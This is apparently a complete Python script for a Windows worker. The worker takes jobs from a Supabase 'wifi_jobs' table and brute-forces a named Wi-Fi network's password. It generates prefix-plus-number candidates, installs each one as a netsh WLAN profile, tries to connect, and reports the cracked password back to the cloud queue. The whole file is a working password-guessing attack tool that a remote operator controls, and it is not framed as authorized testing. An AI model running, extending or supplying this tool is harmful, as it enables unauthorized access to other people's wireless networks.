import html
import os
import subprocess
import tempfile
import time
from supabase import create_client, Client

SUPABASE_URL = "https://YOUR_PROJECT.supabase.co"
SUPABASE_KEY = "YOUR_ANON_KEY"

supabase: Client = create_client(SUPABASE_URL, SUPABASE_KEY)


def _run_netsh(args: list[str]) -> tuple[int, str]:
    flags = subprocess.CREATE_NO_WINDOW if os.name == "nt" else 0
    res = subprocess.run(["netsh", *args], capture_output=True, text=True, timeout=40, creationflags=flags)
    return res.returncode, ((res.stdout or "") + (res.stderr or "")).strip()


def _profile_xml(ssid: str, password: str, auth: str) -> str:
    safe_name = html.escape(ssid)
    safe_key = html.escape(password)
    auth_val = "WPA3SAE" if auth == "WPA3" else "WPA2PSK"
    return f"""<?xml version="1.0"?>
<WLANProfile xmlns="http://www.microsoft.com/networking/WLAN/profile/v1">
    <name>{safe_name}</name>
    <SSIDConfig><SSID><name>{safe_name}</name></SSID></SSIDConfig>
    <connectionType>ESS</connectionType>
    <connectionMode>auto</connectionMode>
    <MSM>
        <security>
            <authEncryption>
                <authentication>{auth_val}</authentication>
                <encryption>AES</encryption>
                <useOneX>false</useOneX>
            </authEncryption>
            <sharedKey>
                <keyType>passPhrase</keyType>
                <protected>false</protected>
                <keyMaterial>{safe_key}</keyMaterial>
            </sharedKey>
        </security>
    </MSM>
</WLANProfile>"""


def connect_attempt(ssid: str, password: str, auth: str) -> bool:
    _run_netsh(["wlan", "delete", "profile", f"name={ssid}"])
    with tempfile.NamedTemporaryFile(mode="w", suffix=".xml", delete=False, encoding="utf-8") as handle:
        handle.write(_profile_xml(ssid, password, auth))
        path = handle.name

    try:
        _run_netsh(["wlan", "add", "profile", f"filename={path}", "user=current"])
        _run_netsh(["wlan", "connect", f"name={ssid}", f"ssid={ssid}"])
        time.sleep(4)
        _, status = _run_netsh(["wlan", "show", "interfaces"])
        return f"SSID                   : {ssid}" in status and "State                  : connected" in status
    finally:
        if os.path.exists(path):
            os.remove(path)


def process_job(job):
    job_id = job["id"]
    ssid = job["ssid"]
    prefix = job["prefix"]
    start_num = job["start_suffix"]
    attempts = job["attempts"]
    auth = job["auth_type"]

    print(f"\n[+] Picked up Job #{job_id}: Target '{ssid}', starting from {prefix}{start_num}")
    supabase.table("wifi_jobs").update({"status": "running"}).eq("id", job_id).execute()

    for offset in range(attempts):
        candidate_pwd = f"{prefix}{start_num + offset}"
        print(f" -> Trying ({offset + 1}/{attempts}): {candidate_pwd}")

        supabase.table("wifi_jobs").update({
            "result_message": f"Testing ({offset + 1}/{attempts}): {candidate_pwd}"
        }).eq("id", job_id).execute()

        if connect_attempt(ssid, candidate_pwd, auth):
            print(f"[✓] Connected successfully! Password: {candidate_pwd}")
            supabase.table("wifi_jobs").update({
                "status": "success",
                "result_message": f"Connected! Correct Password: {candidate_pwd}"
            }).eq("id", job_id).execute()
            return

        time.sleep(1)

    print("[-] Finished attempts without connecting.")
    supabase.table("wifi_jobs").update({
        "status": "failed",
        "result_message": f"Failed after {attempts} attempts."
    }).eq("id", job_id).execute()


def start_worker():
    print("[*] Local Windows Wi-Fi Agent started. Waiting for jobs from Cloud UI...")
    while True:
        try:
            res = supabase.table("wifi_jobs").select("*").eq("status", "pending").order("created_at").limit(1).execute()
            if res.data:
                process_job(res.data[0])
        except Exception as e:
            print(f"Polling error: {e}")
        time.sleep(3)


if __name__ == "__main__":
    start_worker()